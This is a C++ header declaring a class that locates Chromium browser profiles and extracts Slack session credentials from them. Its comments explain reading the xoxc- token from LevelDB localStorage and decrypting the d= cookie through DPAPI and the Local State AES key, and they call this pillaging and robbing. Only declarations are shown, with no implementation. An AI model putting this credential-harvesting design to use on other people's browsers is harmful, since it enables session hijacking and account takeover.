#pragma once
#include <string>
#include <vector>
#include <optional>

namespace conduit {

// pillages Slack credentials from Chromium-based browsers.
// reads the xoxc- token from localStorage (LevelDB, unencrypted)
// and the d= session cookie from the Cookies DB (SQLite, DPAPI encrypted).
// works because we're running as the same OS user who logged into Slack.
// chrome, edge, brave, vivaldi, opera gx — if it's chromium, we can rob it.
struct BrowserCredential {
    std::string browser_name;
    std::string token;    // xoxc-...
    std::string cookie;   // d= session cookie (decrypted)
};

class BrowserCredentials {
public:
    // scan all known Chromium browsers and return any Slack credentials found
    static std::vector<BrowserCredential> scan();

private:
    struct BrowserProfile {
        std::string name;
        std::string user_data_path;
    };

    static std::vector<BrowserProfile> findChromiumProfiles();

    // scan LevelDB files in localStorage for the xoxc- token
    static std::optional<std::string> extractToken(const std::string& local_storage_path);

    // read the d= cookie from the Cookies SQLite DB and decrypt with DPAPI
    static std::optional<std::string> extractCookie(const std::string& user_data_path);

#ifdef _WIN32
    // decrypt Chrome's DPAPI-encrypted cookie value
    static std::optional<std::string> decryptChromeValue(const std::vector<uint8_t>& encrypted,
                                                          const std::string& user_data_path);
    // get the AES key from Chrome's Local State file (encrypted with DPAPI)
    static std::optional<std::vector<uint8_t>> getEncryptionKey(const std::string& user_data_path);
#endif
};

} // namespace conduit
